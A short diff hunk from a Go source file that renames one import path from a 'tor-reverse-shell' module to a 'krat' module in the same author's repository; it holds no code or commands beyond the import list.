@@ -8,7 +8,7 @@ import (
 	"strings"
 
 	"github.com/google/uuid"
-	"github.com/humbertovnavarro/tor-reverse-shell/pkg/fs"
+	"github.com/humbertovnavarro/krat/pkg/fs"
 	"github.com/joho/godotenv"
 )
 
